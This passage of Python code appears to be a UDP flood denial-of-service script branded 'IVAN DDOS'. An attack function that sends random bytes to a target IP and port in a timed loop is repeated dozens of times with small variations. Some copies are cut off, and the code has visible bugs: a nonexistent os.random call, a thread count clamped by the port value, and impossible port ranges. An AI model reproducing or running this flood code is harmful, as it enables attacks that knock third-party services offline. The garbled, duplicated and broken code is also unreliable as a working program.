        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Selesai')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Selesai')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
